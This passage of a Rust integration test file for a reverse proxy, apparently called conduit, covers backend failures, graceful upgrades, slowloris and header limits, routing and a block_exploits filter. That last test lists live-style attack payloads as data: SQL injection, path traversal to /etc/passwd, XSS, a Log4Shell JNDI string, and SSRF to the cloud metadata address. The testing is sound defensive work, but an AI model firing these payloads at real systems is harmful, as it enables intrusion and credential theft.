                        "{path}: got the answer for {} ({:?})",
                        a.path,
                        String::from_utf8_lossy(&a.body)
                    ));
                }
                // conduit may close the connection after an error answer.
                if fresh || a.close || a.status != 200 {
                    conn = None;
                }
                (a.status, a.backend)
            }
            Err(e) => {
                bad.push(format!(
                    "{path} ({}): {e}",
                    if post { "POST" } else { "GET" }
                ));
                conn = None;
                (0, 0)
            }
        };
        recs.push(Rec {
            start,
            end,
            status,
            backend,
            kind,
        });
        thread::sleep(Duration::from_millis(1));
    }
    (recs, bad)
}

fn open_fds(pid: u32) -> usize {
    std::fs::read_dir(format!("/proc/{pid}/fd")).map_or(0, |d| d.count())
}

/// Backends die, hang, all go down at once and flap quickly while GET and POST traffic runs
/// over keep-alive and fresh client connections. Every failed request must be explained by
/// one of those events; conduit must not panic, must answer every request, and must give
/// back every backend slot and connection afterwards.
#[test]
fn upstream_flapping() {
    let dir = test_dir("flap");
    let backends = [Flappy::start(), Flappy::start(), Flappy::start()];
    let (a, b, c) = (&backends[0], &backends[1], &backends[2]);
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
defaults:
  upstream_idle_timeout: 1s
upstreams:
  flap:
    backends: [http://127.0.0.1:{pa}, http://127.0.0.1:{pb}, http://127.0.0.1:{pc}]
    retries: 2
    health_check: {{ path: /health, interval: 100ms, timeout: 100ms, rise: 2, fall: 2 }}
    passive: {{ failures: 3, eject: 2s }}
sites:
  - id: flap
    hosts: [flap.test]
    upstream: flap
    connect_timeout: 200ms
    read_timeout: 500ms
"#,
            d = dir.display(),
            pa = a.port,
            pb = b.port,
            pc = c.port,
        ),
    )
    .unwrap();
    let mut proxy = Proxy {
        child: spawn(&cfg_path, &[], "stderr.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    wait_for_port(admin);
    let pid = proxy.child.id();
    for f in &backends {
        let addr = format!("127.0.0.1:{}", f.port);
        wait_until("backends healthy", Duration::from_secs(5), || {
            backend_state(admin, "flap", &addr)["healthy"] == true
        });
    }
    let fds_before = open_fds(pid);

    let t0 = Instant::now();
    let now = || t0.elapsed().as_micros() as u64;
    let stop = Arc::new(AtomicBool::new(false));
    let clients: Vec<_> = (0..6)
        .map(|id| {
            // Keep-alive GET twice, keep-alive POST, fresh-connection GET twice and POST.
            let kind = [0, 0, 1, 2, 2, 3][id];
            let stop = stop.clone();
            thread::spawn(move || flap_client(http_port, kind, id, t0, stop))
        })
        .collect();
    let pause = |ms| thread::sleep(Duration::from_millis(ms));
    // When a backend died (requests in flight then may fail): from asking it to stop until
    // it had stopped.
    let mut kills = Vec::new();
    let mut kill = |f: &Flappy| {
        let from = now();
        f.set(DOWN);
        kills.push((from, now()));
    };

    pause(1500);
    let warm_end = now();
    kill(a);
    pause(2500);
    a.set(UP);
    pause(1500);

    let hang_start = now();
    b.set(HANG);
    pause(2500);
    b.set(UP);
    let hang_end = now();
    pause(1500);

    let all_down_from = now();
    for f in &backends {
        kill(f);
    }
    let all_down_start = now();
    pause(1500);
    let all_down_end = now();
    for f in &backends {
        f.set(UP);
    }
    let all_up = now();
    pause(1500);

    for _ in 0..20 {
        kill(a);
        pause(100);
        a.set(UP);
        pause(100);
    }
    let flap_end = now();
    pause(3000);
    let settled = now();
    pause(1000);
    stop.store(true, Ordering::SeqCst);

    let (mut recs, mut bad) = (Vec::new(), Vec::new());
    for h in clients {
        let (r, b) = h.join().unwrap();
        recs.extend(r);
        bad.extend(b);
    }
    assert!(
        proxy.child.try_wait().unwrap().is_none(),
        "conduit exited during the test"
    );

    // How long a stuck backend may keep getting requests: health checks (2 failed probes of
    // 100ms) or passive ejection (3 errors of 500ms each), with room for a busy machine.
    let detect = 2_000_000;
    let explained = |r: &Rec| {
        let in_flight_at_kill = kills
            .iter()
            .any(|&(from, to)| r.start <= to && r.end >= from);
        let during_hang = r.end >= hang_start && r.start <= hang_end.max(hang_start + detect);
        let all_down = r.start <= all_up && r.end >= all_down_from;
        match r.status {
            502 => in_flight_at_kill || all_down,
            504 => during_hang,
            _ => false,
        }
    };
    let failed: Vec<_> = recs.iter().filter(|r| r.status != 200).collect();
    let unexplained: Vec<_> = failed
        .iter()
        .filter(|r| !explained(r))
        .take(20)
        .map(|r| {
            format!(
                "kind {} status {} {}..{} ms",
                r.kind,
                r.status,
                r.start / 1000,
                r.end / 1000
            )
        })
        .collect();
    let count = |from: u64, to: u64, ok: bool| {
        recs.iter()
            .filter(|r| r.start >= from && r.start < to && (r.status == 200) == ok)
            .count()
    };
    eprintln!(
        "upstream_flapping: {} requests, {} failed ({} unexplained); warm-up {} ok; \
         hang {} failed; all down {} failed of {}",
        recs.len(),
        failed.len(),
        unexplained.len(),
        count(0, warm_end, true),
        count(hang_start, hang_end, false),
        count(all_down_start, all_down_end, false),
        count(all_down_start, all_down_end, false) + count(all_down_start, all_down_end, true),
    );
    assert!(
        bad.is_empty(),
        "wrong or missing answers: {:?}",
        &bad[..bad.len().min(20)]
    );
    assert!(
        unexplained.is_empty(),
        "unexplained failures: {unexplained:?}"
    );
    // No answer can come from a backend while all are down. A request that started just
    // before they came back may be retried onto one that is up again, so this looks at
    // requests that also ended within the window.
    let ok_while_down: Vec<_> = recs
        .iter()
        .filter(|r| r.start >= all_down_start && r.end <= all_down_end && r.status == 200)
        .collect();
    assert!(
        ok_while_down.is_empty(),
        "requests succeeded with every backend down: {:?}",
        ok_while_down
            .iter()
            .map(|r| (r.start, r.end, r.backend))
            .collect::<Vec<_>>()
    );
    assert!(
        recs.iter()
            .filter(|r| r.start >= all_down_start && r.end <= all_down_end)
            .all(|r| r.end - r.start < 100_000),
        "with every backend down, requests should fail at once"
    );
    // Every backend is back in rotation once the flapping stops.
    for f in &backends {
        assert!(
            recs.iter()
                .any(|r| r.start >= settled && r.status == 200 && r.backend == f.port),
            "backend {} got no traffic after recovering",
            f.port
        );
    }
    assert!(flap_end < settled);

    let stderr = std::fs::read_to_string(dir.join("stderr.log")).unwrap();
    assert!(!stderr.contains("panicked"), "conduit panicked:\n{stderr}");
    // Every request is logged once, nothing stays leased, and pooled connections close.
    let lines = || std::fs::read_to_string(dir.join("access.log")).map_or(0, |s| s.lines().count());
    wait_until("every request logged", Duration::from_secs(5), || {
        lines() == recs.len()
    });
    for f in &backends {
        let addr = format!("127.0.0.1:{}", f.port);
        wait_until("backend idle and healthy", Duration::from_secs(5), || {
            let s = backend_state(admin, "flap", &addr);
            s["in_flight"] == 0 && s["healthy"] == true
        });
    }
    wait_until(
        "upstream connections closed",
        Duration::from_secs(6),
        || open_fds(pid) <= fds_before + 2,
    );
    let _ = proxy.child.kill();
}

/// A graceful upgrade with WebSockets open. After SIGQUIT the old process keeps accepting for
/// 5 s (Pingora's fixed `CLOSE_TIMEOUT`, so no connection finds nobody listening), then stops
/// accepting, waits `shutdown_grace`, and gives its runtimes `shutdown_timeout`. Its
/// WebSockets keep flowing until then and are closed when it exits (clients reconnect);
/// it does not linger.
#[test]
fn upgrade_with_open_websockets() {
    let dir = test_dir("upgrade-ws");
    let (up, _) = upgrade_upstream();
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 2s
  shutdown_timeout: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
sites:
  - id: ws
    hosts: [ws.test]
    upstream: http://127.0.0.1:{up}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let mut old = Proxy {
        child: spawn(&cfg_path, &[], "old.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let open = || {
        let (mut s, head) = open_upgrade(http_port, &websocket_request("ws.test"));
        assert!(head.starts_with("HTTP/1.1 101"), "{head}");
        echo(&mut s, b"hello");
        s
    };
    let mut before: Vec<TcpStream> = (0..5).map(|_| open()).collect();

    let new = Proxy {
        child: spawn(&cfg_path, &["--upgrade"], "new.log"),
        dir: dir.clone(),
    };
    let sock = dir.join("upgrade.sock");
    wait_until("the upgrade socket", Duration::from_secs(4), || {
        sock.exists()
    });
    signal(old.child.id(), "-QUIT");
    let quit = Instant::now();

    // Both processes accept for a while; old connections keep flowing.
    thread::sleep(Duration::from_millis(500));
    for s in &mut before {
        echo(s, b"right after SIGQUIT");
    }
    let _early = open();

    // Once the old process stops accepting, everything new reaches the new one, while the
    // old WebSockets still flow during its grace period.
    thread::sleep(Duration::from_millis(5_500).saturating_sub(quit.elapsed()));
    assert_eq!(
        status_json(admin)["pid"],
        serde_json::json!(new.child.id()),
        "the old process still accepts"
    );
    let mut after = open();
    for s in &mut before {
        echo(s, b"during the grace period");
    }

    // The old process ends after 5 s + shutdown_grace + shutdown_timeout and closes what
    // it still holds.
    let status = wait_exit(&mut old.child, Duration::from_secs(20));
    let exited = quit.elapsed();
    assert!(status.success(), "old process exited with {status}");
    assert!(
        exited >= Duration::from_secs(7) && exited < Duration::from_secs(12),
        "old process exited {exited:?} after SIGQUIT"
    );
    for s in &mut before {
        s.set_read_timeout(Some(Duration::from_secs(2))).unwrap();
        let mut b = [0u8; 16];
        let gone = match s.write_all(b"still there?") {
            Err(_) => true,
            Ok(()) => !matches!(s.read(&mut b), Ok(n) if n > 0),
        };
        assert!(gone, "an old WebSocket outlived the old process");
    }
    // Each WebSocket the old process closed still gets its access log line.
    let logged = std::fs::read_to_string(dir.join("access.log"))
        .unwrap_or_default()
        .lines()
        .filter(|l| l.contains("\"status\":101") && l.contains("\"error\":\"Cancelled\""))
        .count();
    assert!(
        logged >= before.len(),
        "{logged} WebSocket lines logged, want at least {}",
        before.len()
    );
    echo(&mut after, b"after the old process exited");
    let mut fresh = open();
    echo(&mut fresh, b"new connection");
    eprintln!("upgrade with WebSockets: old process exited {exited:?} after SIGQUIT");
    drop(new);
    std::mem::forget(old);
}

/// Idle and slow clients cannot hold connections: an idle keep-alive connection closes after
/// `keepalive_timeout` whatever the client's `Keep-Alive` header asks, and oversized or
/// malformed request heads get an error instead of a hang.
#[test]
fn idle_and_malformed_clients() {
    let dir = test_dir("clients");
    let (up, _) = echo_upstream();
    let http_port = free_port();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 1
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
defaults:
  keepalive_timeout: 1s
sites:
  - id: a
    hosts: [a.test]
    upstream: http://127.0.0.1:{up}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);

    for keep_alive in ["", "Keep-Alive: timeout=600\r\n"] {
        let mut s = TcpStream::connect(("127.0.0.1", http_port)).unwrap();
        s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
        write!(s, "GET / HTTP/1.1\r\nHost: a.test\r\n{keep_alive}\r\n").unwrap();
        let mut conn = BufReader::new(s);
        let a = keepalive_exchange(&mut conn, b"").unwrap();
        assert_eq!(a.status, 200);
        let idle = idle_close(conn.get_mut());
        assert!(
            idle >= Duration::from_millis(800) && idle < Duration::from_secs(3),
            "idle keep-alive connection ({keep_alive:?}) closed after {idle:?}"
        );
    }

    let head_status = |head: Vec<u8>| {
        let mut s = TcpStream::connect(("127.0.0.1", http_port)).unwrap();
        s.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
        let _ = s.write_all(&head);
        let mut b = [0u8; 64];
        let n = s.read(&mut b).unwrap_or(0);
        String::from_utf8_lossy(&b[..n])
            .split("\r\n")
            .next()
            .unwrap_or("")
            .to_string()
    };
    let big = |n| {
        let mut h = b"GET / HTTP/1.1\r\nHost: a.test\r\nX-Big: ".to_vec();
        h.extend(std::iter::repeat_n(b'a', n));
        h.extend_from_slice(b"\r\n\r\n");
        h
    };
    let many: String = (0..300).map(|i| format!("X-{i}: v\r\n")).collect();
    // Pingora takes request heads up to 1 MiB.
    assert_eq!(
        head_status(big(64 << 10)),
        "HTTP/1.1 200 OK",
        "64 KiB header"
    );
    for (what, head) in [
        ("2 MiB header", big(2 << 20)),
        (
            "300 headers",
            format!("GET / HTTP/1.1\r\nHost: a.test\r\n{many}\r\n").into_bytes(),
        ),
        ("not HTTP", b"\x16\x03\x01\x00\xff garbage\r\n\r\n".to_vec()),
    ] {
        let status = head_status(head);
        assert!(
            status.starts_with("HTTP/1.1 4"),
            "{what}: answered {status:?}"
        );
    }
    // Still serving.
    assert_eq!(http(http_port, "a.test", "/", &[]).status, 200);
}

/// A client sending its request head a little at a time (slowloris) is cut off once the head
/// has taken longer than the read timeout (60 s, Pingora's), not kept forever. Slow, so
/// `--ignored`.
#[test]
#[ignore]
fn slow_request_head_is_cut_off() {
    let dir = test_dir("slowloris");
    let (up, _) = echo_upstream();
    let http_port = free_port();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 1
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
sites:
  - id: a
    hosts: [a.test]
    upstream: http://127.0.0.1:{up}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let mut s = TcpStream::connect(("127.0.0.1", http_port)).unwrap();
    let start = Instant::now();
    s.write_all(b"GET / HTTP/1.1\r\nHost: a.test\r\n").unwrap();
    let cut = loop {
        thread::sleep(Duration::from_secs(2));
        if s.write_all(b"X-Slow: 1\r\n").is_err() || start.elapsed() > Duration::from_secs(90) {
            break start.elapsed();
        }
    };
    assert!(
        cut > Duration::from_secs(55) && cut < Duration::from_secs(70),
        "cut off after {cut:?}"
    );
}

/// CPU time (user + system) of a process, from /proc.
fn cpu_time(pid: u32) -> Duration {
    let stat = std::fs::read_to_string(format!("/proc/{pid}/stat")).unwrap();
    // Fields after the command name, which is in parentheses and may contain spaces.
    let rest = &stat[stat.rfind(')').unwrap() + 2..];
    let f: Vec<u64> = rest
        .split(' ')
        .skip(11)
        .take(2)
        .map(|v| v.parse().unwrap())
        .collect();
    Duration::from_millis((f[0] + f[1]) * 10)
}

/// Out of file descriptors (more idle clients than `ulimit -n` allows): conduit keeps running
/// without spinning on failed accepts, and serves again once clients leave.
#[test]
fn file_descriptors_run_out() {
    let dir = test_dir("nofile");
    let (up, _) = echo_upstream();
    let http_port = free_port();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
sites:
  - id: a
    hosts: [a.test]
    upstream: http://127.0.0.1:{up}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let stderr = std::fs::File::create(dir.join("conduit.log")).unwrap();
    let child = Command::new("sh")
        .arg("-c")
        .arg(format!(
            "ulimit -n 128 && exec '{}' run -c '{}'",
            env!("CARGO_BIN_EXE_conduit"),
            cfg_path.display()
        ))
        .stdout(Stdio::null())
        .stderr(stderr)
        .spawn()
        .unwrap();
    let pid = child.id();
    let mut proxy = Proxy {
        child,
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    assert_eq!(http(http_port, "a.test", "/", &[]).status, 200);

    // Far more connections than descriptors: those past the limit wait in the backlog.
    let idle: Vec<TcpStream> = (0..250)
        .filter_map(|_| TcpStream::connect(("127.0.0.1", http_port)).ok())
        .collect();
    wait_until("descriptors used up", Duration::from_secs(5), || {
        open_fds(pid) >= 120
    });
    let cpu = cpu_time(pid);
    thread::sleep(Duration::from_secs(3));
    let spent = cpu_time(pid) - cpu;
    assert!(
        spent < Duration::from_millis(500),
        "{spent:?} of CPU in 3 s while out of descriptors"
    );
    assert!(proxy.child.try_wait().unwrap().is_none(), "conduit exited");

    drop(idle);
    wait_until("serving again", Duration::from_secs(10), || {
        let mut s = match TcpStream::connect(("127.0.0.1", http_port)) {
            Ok(s) => s,
            Err(_) => return false,
        };
        s.set_read_timeout(Some(Duration::from_secs(2))).unwrap();
        s.write_all(request("/", "a.test", &[]).as_bytes()).is_ok()
            && read_all(&mut s).starts_with(b"HTTP/1.1 200")
    });
    let log = std::fs::read_to_string(dir.join("conduit.log")).unwrap();
    assert!(!log.contains("panicked"), "{log}");
}

/// The body of a chunked HTTP/1.1 response.
fn dechunk(body: &str) -> String {
    let mut out = String::new();
    let mut rest = body;
    while let Some((size, after)) = rest.split_once("\r\n") {
        let n = usize::from_str_radix(size.trim(), 16).unwrap_or(0);
        if n == 0 {
            break;
        }
        out.push_str(&after[..n]);
        rest = &after[n + 2..];
    }
    out
}

/// An upstream for `body_replace`: HTML sent in small pieces (chunked, or with a length on
/// `/len`), JSON on `/json`, and a body marked gzip on `/gz`. Each answer says which
/// Accept-Encoding and Range it received.
fn html_upstream() -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            thread::spawn(move || {
                let mut stream = stream;
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut head = String::new();
                loop {
                    let mut line = String::new();
                    if reader.read_line(&mut line).unwrap_or(0) == 0 {
                        return;
                    }
                    if line == "\r\n" {
                        break;
                    }
                    head.push_str(&line);
                }
                let path = head.split_whitespace().nth(1).unwrap_or("/").to_string();
                let seen = |name: &str| head_value(&head, name).unwrap_or_else(|| "none".into());
                let common = format!(
                    "X-Seen-AE: {}\r\nX-Seen-Range: {}\r\nETag: \"v1\"\r\n\
                     Last-Modified: Mon, 02 Nov 2026 10:00:00 GMT\r\nConnection: close\r\n",
                    seen("accept-encoding"),
                    seen("range"),
                );
                let pieces = [
                    "<a href=\"http://inter",
                    "nal:8080/x\">http://internal:80",
                    "80</a> http://internal:8080",
                ];
                let whole: String = pieces.concat();
                let w = &mut stream;
                let _ = match path.as_str() {
                    "/len" => write!(
                        w,
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n{common}Content-Length: {}\r\n\r\n{whole}",
                        whole.len()
                    ),
                    "/json" | "/gz" => write!(
                        w,
                        "HTTP/1.1 200 OK\r\nContent-Type: {}\r\n{common}Content-Length: {}\r\n\r\n{whole}",
                        if path == "/json" {
                            "application/json"
                        } else {
                            "text/html\r\nContent-Encoding: gzip"
                        },
                        whole.len()
                    ),
                    _ => {
                        let _ = write!(
                            w,
                            "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n{common}Transfer-Encoding: chunked\r\n\r\n"
                        );
                        for p in pieces {
                            let _ = write!(w, "{:x}\r\n{p}\r\n", p.len());
                            let _ = w.flush();
                            thread::sleep(Duration::from_millis(30));
                        }
                        write!(w, "0\r\n\r\n")
                    }
                };
            });
        }
    });
    port
}

/// `proxy` rules (another upstream, a changed path) and `body_replace`, over the wire.
#[test]
fn routes_and_body_replace() {
    let dir = test_dir("routes");
    let (a, _) = echo_upstream();
    let (b, _) = echo_upstream();
    let html = html_upstream();
    let http_port = free_port();
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 1
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
upstreams:
  api: {{ backends: ["http://127.0.0.1:{b}"] }}
sites:
  - id: a
    hosts: [a.test]
    upstream: http://127.0.0.1:{a}
    plugins:
      - rules:
          - name: admin
            match: {{ path: {{ prefix: /admin }} }}
            action: {{ deny: 403 }}
          - name: api
            match: {{ path: {{ prefix: /api/ }} }}
            action: {{ proxy: {{ upstream: api, strip_prefix: /api }} }}
          - name: legacy
            match: {{ path: {{ regex: "^/old/" }} }}
            action: {{ proxy: {{ rewrite: {{ regex: "^/old/(.*)$", to: "/new/${{1}}" }} }} }}
          - name: canary
            match: {{ headers: {{ x-canary: {{ equals: "1" }} }} }}
            action: {{ proxy: {{ upstream: "http://127.0.0.1:{b}", add_prefix: /canary }} }}
      - rules:
          - match: {{ path: {{ exact: /api/blocked }} }}
            action: {{ deny: 451 }}
  - id: h
    hosts: [h.test]
    upstream: http://127.0.0.1:{html}
    plugins:
      - body_replace:
          replace:
            - {{ from: "http://internal:8080", to: "https://h.test" }}
  - id: hc
    hosts: [hc.test]
    upstream: http://127.0.0.1:{html}
    cache: {{ default_ttl: 1m }}
    plugins:
      - body_replace:
          replace:
            - {{ from: "http://internal:8080", to: "https://h.test" }}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);

    // (path, extra headers) -> (backend, request line it received)
    type Case<'a> = (&'a str, &'a [(&'a str, &'a str)], u16, &'a str);
    let cases: [Case; 7] = [
        ("/api/users?x=1", &[], b, "get /users?x=1 http/1.1"),
        // The encoded form of /api/ is routed too; the path goes out normalized.
        ("/%61pi/./v1/../v2", &[], b, "get /v2 http/1.1"),
        ("/api/a%20b?q=%20", &[], b, "get /a%20b?q=%20 http/1.1"),
        ("/api/", &[], b, "get / http/1.1"),
        ("/old/x/y?z", &[], a, "get /new/x/y?z http/1.1"),
        (
            "/page",
            &[("X-Canary", "1")],
            b,
            "get /canary/page http/1.1",
        ),
        ("/plain%20x?y", &[], a, "get /plain%20x?y http/1.1"),
    ];
    for (path, extra, backend, line) in cases {
        let r = http(http_port, "a.test", path, extra);
        assert_eq!(r.status, 200, "{path}: {r:?}");
        assert_eq!(r.header("x-backend"), Some(&*backend.to_string()), "{path}");
        assert_eq!(r.body.lines().next(), Some(line), "{path}");
    }
    assert_eq!(http(http_port, "a.test", "/admin/x", &[]).status, 403);
    // A routed request still meets the plugins after the rule.
    assert_eq!(http(http_port, "a.test", "/api/blocked", &[]).status, 451);

    let want = "<a href=\"https://h.test/x\">https://h.test</a> https://h.test";
    // Chunked upstream, the string split across chunks.
    let r = http(http_port, "h.test", "/", &[("Range", "bytes=0-3")]);
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.header("transfer-encoding"), Some("chunked"));
    assert_eq!(dechunk(&r.body), want);
    assert_eq!(r.header("x-seen-range"), Some("none"));
    assert_eq!(r.header("etag"), None);
    assert_eq!(r.header("last-modified"), None);
    let r = http(http_port, "h.test", "/", &[("Accept-Encoding", "gzip")]);
    assert_eq!(r.header("x-seen-ae"), Some("none"));
    // A length from the upstream no longer holds.
    let r = http(http_port, "h.test", "/len", &[]);
    assert_eq!(r.header("content-length"), None);
    assert_eq!(dechunk(&r.body), want);
    // HTTP/1.0: the body ends with the connection.
    let mut s = TcpStream::connect(("127.0.0.1", http_port)).unwrap();
    s.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
    s.write_all(b"GET /len HTTP/1.0\r\nHost: h.test\r\n\r\n")
        .unwrap();
    let r = parse(&read_all(&mut s));
    assert_eq!((r.status, r.header("transfer-encoding")), (200, None));
    assert_eq!(r.body, want);
    // From the cache too, and whole even when a range is asked for: the range would be cut
    // from the upstream's bytes.
    for (i, range) in ["", "bytes=0-3"].into_iter().enumerate() {
        let extra: &[(&str, &str)] = if range.is_empty() {
            &[]
        } else {
            &[("Range", range)]
        };
        let r = http(http_port, "hc.test", "/len", extra);
        assert_eq!(r.status, 200, "{r:?}");
        assert_eq!(dechunk(&r.body), want, "{r:?}");
        let cached = r.header("cache-status").is_some_and(|c| c.contains("hit"));
        assert_eq!(cached, i == 1, "{r:?}");
    }
    // Other types, and bodies still encoded, pass as they are.
    for path in ["/json", "/gz"] {
        let r = http(http_port, "h.test", path, &[]);
        assert!(r.body.contains("http://internal:8080"), "{path}: {r:?}");
        assert!(r.header("content-length").is_some(), "{path}");
        assert_eq!(r.header("etag"), Some("\"v1\""), "{path}");
    }

    let log = std::fs::read_to_string(dir.join("conduit.log")).unwrap();
    assert!(!log.contains("panicked"), "{log}");
}

/// An upstream that answers 200 "ok" and records each request line and its headers.
fn recording_upstream() -> (u16, Arc<std::sync::Mutex<Vec<String>>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
    let log = seen.clone();
    thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let log = log.clone();
            thread::spawn(move || {
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut stream = stream;
                loop {
                    let mut head = String::new();
                    loop {
                        let mut line = String::new();
                        match reader.read_line(&mut line) {
                            Ok(0) | Err(_) => return,
                            Ok(_) if line == "\r\n" => break,
                            Ok(_) => head.push_str(&line),
                        }
                    }
                    log.lock().unwrap().push(head);
                    if stream
                        .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
                        .is_err()
                    {
                        return;
                    }
                }
            });
        }
    });
    (port, seen)
}

#[test]
fn block_exploits() {
    let dir = test_dir("exploits");
    let (upstream, seen) = recording_upstream();
    let (http_port, admin) = (free_port(), free_port());
    let cfg_path = dir.join("conduit.yaml");
    std::fs::write(
        &cfg_path,
        format!(
            r#"
server:
  threads: 2
  shutdown_grace: 1s
  pid_file: {d}/conduit.pid
  upgrade_sock: {d}/upgrade.sock
listen:
  http: ["127.0.0.1:{http_port}"]
admin:
  listen: "127.0.0.1:{admin}"
access_log:
  path: {d}/access.log
sites:
  - id: shield
    hosts: [shield.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - block_exploits:
          skip_params: [token]
          except: [{{ match: {{ path: {{ prefix: /search }} }}, categories: [xss] }}]
  - id: watch
    hosts: [watch.test]
    upstream: http://127.0.0.1:{upstream}
    plugins:
      - block_exploits: {{ mode: log }}
"#,
            d = dir.display()
        ),
    )
    .unwrap();
    let _proxy = Proxy {
        child: spawn(&cfg_path, &[], "conduit.log"),
        dir: dir.clone(),
    };
    wait_for_port(http_port);
    let get = |host: &str, path: &str, extra: &[(&str, &str)]| http(http_port, host, path, extra);
    let reached = |path: &str| {
        seen.lock()
            .unwrap()
            .iter()
            .any(|h| h.starts_with(&format!("GET {path} HTTP/1.1")))
    };

    // Ordinary requests, some close to an attack, reach the upstream unchanged.
    for path in [
        "/login?redirect_uri=http://localhost:3000/cb&scope=openid+profile",
        "/search?q=%3Cscript%3E",
        "/x?token=%3Cscript%3Ealert(1)%3C/script%3E&page=2",
        "/owner/repo/src/branch/main/.env.example",
        "/.well-known/acme-challenge/abc",
        "/list?sort=created_at&order=desc",
    ] {
        let r = get("shield.test", path, &[("User-Agent", "Mozilla/5.0")]);
        assert_eq!((r.status, r.body.as_str()), (200, "ok"), "{path}");
        assert!(reached(path), "{path} did not reach the upstream");
    }

    // Attacks are refused and never reach it.
    type Attack<'a> = (&'a str, &'a [(&'a str, &'a str)], &'a str);
    let attacks: &[Attack] = &[
        ("/item?id=1+union+select+null,null--", &[], "sqli"),
        ("/item?id=1%27%20or%20%271%27=%271", &[], "sqli"),
        ("/.env", &[], "dotfiles"),
        ("/static/..;/manager/html", &[], "traversal"),
        ("/dl?f=..%2F..%2F..%2Fetc%2Fpasswd", &[], "traversal"),
        ("/x?q=%3Cimg%20src=x%20onerror=alert(1)%3E", &[], "xss"),
        ("/search?q=1+union+select+1,2", &[], "sqli"),
        (
            "/",
            &[("User-Agent", "sqlmap/1.8.2#stable (https://sqlmap.org)")],
            "scanners",
        ),
        (
            "/",
            &[("X-Api-Version", "${jndi:ldap://198.51.100.1/a}")],
            "rce",
        ),
        (
            "/admin",
            &[("X-Middleware-Subrequest", "middleware")],
            "rce",
        ),
        (
            "/index.php?page=php://filter/resource=index.php",
            &[],
            "php",
        ),
        (
            "/fetch?url=http://169.254.169.254/latest/meta-data/",
            &[],
            "ssrf",
        ),
    ];
    for (path, headers, _) in attacks {
        let r = get("shield.test", path, headers);
        assert_eq!(r.status, 403, "{path} {headers:?}: {r:?}");
        assert!(!reached(path), "{path} reached the upstream");
    }

    // In log mode they pass, and are counted.
    for (path, headers, _) in attacks {
        let r = get("watch.test", path, headers);
        assert_eq!(r.status, 200, "{path} {headers:?}");
    }

    let m = http(admin, "localhost", "/metrics", &[]).body;
    for (cat, n) in [
        ("sqli", 3.0),
        ("dotfiles", 1.0),
        ("traversal", 2.0),
        ("xss", 1.0),
        ("scanners", 1.0),
        ("rce", 2.0),
        ("php", 1.0),
        ("ssrf", 1.0),
    ] {
        let block = [
            "site=\"shield\"",
            &format!("category=\"{cat}\""),
            "action=\"block\"",
        ];
        assert_eq!(
            metric(&m, "conduit_block_exploits_total", &block),
            Some(n),
            "{cat}"
        );
        let log = [
            "site=\"watch\"",
            &format!("category=\"{cat}\""),
            "action=\"log\"",
        ];
        assert_eq!(
            metric(&m, "conduit_block_exploits_total", &log),
            Some(n),
            "{cat}"
        );
    }
    wait_until("the access log", Duration::from_secs(5), || {
        let log = std::fs::read_to_string(dir.join("access.log")).unwrap_or_default();
        log.contains("\"blocked_by\":\"block_exploits:sqli\"")
            && log.contains("\"blocked_by\":\"block_exploits:rce\"")
    });
    let log = std::fs::read_to_string(dir.join("conduit.log")).unwrap();
    assert!(
        log.contains(
